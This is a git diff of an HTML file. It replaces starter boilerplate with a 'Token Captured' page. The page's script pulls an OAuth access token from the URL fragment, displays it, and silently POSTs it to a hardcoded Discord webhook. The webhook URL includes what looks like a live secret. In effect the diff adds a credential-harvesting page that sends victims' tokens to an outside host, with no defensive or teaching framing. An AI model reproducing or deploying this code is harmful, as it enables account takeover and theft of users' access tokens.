@@ -1,11 +1,23 @@
 <!DOCTYPE html>
 <html>
 <body>
-
-<h1>My First Heading</h1>
-
-<p>My first paragraph.</p>
-
+    <h1>Token Captured</h1>
+    <p>Paste this token to your shared doc or chat.</p>
+    <textarea id="tokenOutput" rows="4" cols="50"></textarea>
+    <script>
+        const hash = window.location.hash.substring(1);
+        const params = new URLSearchParams(hash);
+        const token = params.get('access_token');
+        if (token) {
+            document.getElementById('tokenOutput').value = token;
+            console.log('Token:', token);
+            // Optional: Send to a shared endpoint (e.g., a Discord webhook)
+            fetch('https://discord.com/api/webhooks/1357350899294535881/Xy9T3_mGOnes3FCOj6b0fSzGGaOz2TOWzU8Y6ZchE5NhHK57zAW4mJ3W4A7osdgN6hJP', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `New token: ${token}` })
+            }).then(() => console.log('Token sent to Discord'));
+        }
+    </script>
 </body>
 </html>
-
